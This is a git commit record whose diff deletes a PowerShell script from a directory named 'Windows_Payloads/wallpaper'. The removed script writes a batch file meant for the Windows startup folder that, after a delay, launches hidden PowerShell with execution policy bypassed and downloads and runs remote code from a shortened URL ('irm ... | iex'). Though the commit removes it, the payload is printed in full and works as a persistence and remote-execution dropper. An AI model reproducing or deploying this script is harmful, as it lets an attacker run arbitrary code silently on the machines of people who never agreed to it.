b750684b873862aed1d2a1a727ef9ede5513c749
Isaac Beihoffer <116464736+ibeihoffer@users.noreply.github.com>
2023-02-20 17:22:36 -0600

    Delete Windows_Payloads/wallpaper directory

--- Windows_Payloads/wallpaper/wallpaper_bat_gen.ps1
+++
@@ -1,7 +0,0 @@
-#Creates a .bat file in the startup folder via ps that runs ps script hosted online
-
-$batContent = "@echo off
-timeout /t 90
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm bit.ly/kill-wallpaper | iex"
-
-Set-Content -Path WallpaperEng.bat -Value $batContent -Encoding ASCII
